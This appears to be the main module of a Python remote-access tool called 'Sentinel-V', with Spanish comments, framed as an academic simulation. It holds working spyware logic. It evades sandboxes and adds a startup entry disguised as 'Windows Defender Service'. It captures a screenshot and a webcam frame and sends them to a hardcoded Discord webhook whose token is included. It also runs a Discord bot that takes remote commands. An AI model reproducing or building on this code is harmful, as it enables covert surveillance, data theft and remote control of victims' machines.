from typing import Dict

import os
import json
import logging
import time
from typing import Dict, Optional, Tuple

from .CommandOrchestrator import CommandOrchestrator
from .DiscordConfig import load_discord_credentials
from .ServiceBootManager import is_sandboxed_environment, register_startup_entry
from .TelemetryCore import TelemetryCore
from .TelemetryDispatcher import TelemetryDispatcher
from .VolatileMedia import VolatileMedia

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("SentinelV.__main__")

WEBHOOK_ENDPOINT = "https://discord.com/api/webhooks/1503897443627171922/9ZcDUCVCUUHGrG9lXm55UmZbeDKYYaDSaceeXdv2IGD5CLXJwrAaNn5EdnZQOdrsK69C"


def _try_initial_exfil(media: VolatileMedia, exfil: TelemetryDispatcher, endpoint: str) -> None:
    """Intenta el envío inicial de telemetría. Si falla, lo registra y continúa."""
    try:
        screenshot = media.capture_screenshot()
        webcam_frame = media.capture_webcam_frame()
        encrypted_log = exfil.encrypt_log("Simulación de registro de eventos de telemetría")
        attachments: Dict[str, bytes] = {
            "screenshot.png": screenshot.getvalue(),
            "webcam.jpg": webcam_frame.getvalue(),
        }
        exfil.send_payload(
            endpoint=endpoint,
            encrypted_log=encrypted_log,
            attachments=attachments,
            metadata={"simulation": "sentinel-v", "phase": "post-exploit"},
        )
        logger.info("Telemetría inicial enviada correctamente.")
    except Exception as exc:
        logger.warning("Telemetría inicial omitida (endpoint no disponible): %s", exc)


def main() -> None:
    print("Sentinel-V: Simulación de agente de monitoreo académico")

    if is_sandboxed_environment():
        print("Entorno de análisis detectado. Se cancela la simulación de persistencia.")
    else:
        register_startup_entry(executable_path=__file__, value_name="Windows Defender Service")

    telemetry = TelemetryCore(batch_callback=lambda item: logger.debug("Evento: %s", item))
    media = VolatileMedia()
    exfil = TelemetryDispatcher()

    _try_initial_exfil(media=media, exfil=exfil, endpoint=WEBHOOK_ENDPOINT)

    bot_token, channel_id = load_discord_credentials()
    if bot_token and channel_id:
        try:
            orchestrator = CommandOrchestrator(
                bot_token=bot_token,
                channel_id=channel_id,
                telemetry_dispatcher=exfil,
            )
            orchestrator.run()
            print("CommandOrchestrator iniciado. El agente está escuchando comandos en Discord.")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\nInterrupción de teclado detectada. Deteniendo...")
                orchestrator.stop()
        except Exception as exc:
            logger.exception("Error iniciando CommandOrchestrator: %s", exc)
    else:
        print("CommandOrchestrator no iniciado (credenciales no disponibles)")
        logger.error(
            "No se encontraron credenciales Discord válidas. "
            "Verifica discord_config.json o las variables de entorno."
        )


if __name__ == "__main__":
    main()
